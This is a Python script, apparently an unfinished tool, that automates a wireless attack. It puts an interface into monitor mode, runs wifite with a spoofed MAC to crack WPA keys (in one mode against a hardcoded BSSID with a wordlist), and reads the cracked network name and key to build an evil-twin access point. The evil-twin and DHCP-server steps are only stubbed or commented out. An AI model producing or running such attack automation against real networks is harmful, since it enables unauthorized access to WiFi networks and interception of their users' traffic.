#!/usr/bin/env python

import os
import subprocess
from time import sleep

if os.geteuid() != 0:
    print("\nThis script requires you to run it with root privileges.\n")
    exit(0)

def run_wifite(mon_name, demo):
    try:
        os.system("airmon-ng check kill")
        os.system("ifconfig %s down" %mon_name)
        os.system("airmon-ng start %s" %mon_name)
        cmd = "ifconfig | grep mon | awk -F ':' '{print $1}' | awk '{print $1}'"
        mon_mode = str(os.popen(cmd).read()).strip('\n')
	if demo:
                os.system("wifite -mac -b B4:FB:E4:20:97:E8 --dict demolist.txt -i %s" %mon_mode)
	else:
                os.system("wifite -mac -i %s " %mon_mode)
        return mon_mode
    except KeyboardInterrupt:
        print ("WiFite setup failed, exiting")


def network_restore(mon_name):
    os.system("airmon-ng stop %s" %mon_name)
    os.system("service network-manager restart")

def create_eviltwin():
    crackedfile = file("cracked.txt")
    for line in crackedfile:
        if "\"bssid\": " in line:
            bssid = line.strip().strip("\"bssid\": ").strip("\",")
        elif "\"essid\": " in line:
            essid = line.strip().strip("\"essid\": ").strip("\",")
        elif "\"key\": " in line:
            key = line.strip().strip("\"key\": ").strip("\",")
    #Maybe airodump and get the channel?
    #os.system("airbase-ng -b %s -e %s -c %s %s", bssid, essid, channel, mon_name)

def setup_server():
    os.system("apt-get install isc-dhcp-server")
    
    
    #From the website. Need to modify.
    #f = open("/etc/dhcp/dhcpd.conf", "a+")

    #f.write("subnet 192.168.2.0 netmask 255.255.255.0 {\n")
    #f.write("\toption subnet-mask 255.255.255.0;\n")
    #f.write("\toption broadcast-address 192.168.2.255;\n")
    #f.write("\toption domain-name-servers 8.8.8.8;\n")
    #f.write("\toption routers 192.168.2.1;\n")
    #f.write("\trange 192.168.2.20 192.168.2.60;\n")
    #f.write("}")

if __name__ == "__main__":
    #Print out wireless interfaces
    os.system("iwconfig")
    print ("Do you have at least 2 wireless interfaces before proceeding?")

    demo = raw_input ("Run demo code?")
    monitor_name = raw_input ("What is the name of your wireless interface that supports monitor mode?")
    ap_name = raw_input("What is the name of your AP wireless interface? ")

    print ("\nStarting WiFite with monitor interface")
    mon_name = run_wifite(monitor_name, demo)

    if demo:
        raw_input ("Continue?")

    print("Restart network interfaces")
    create_eviltwin()
    network_restore(mon_name)
       
    

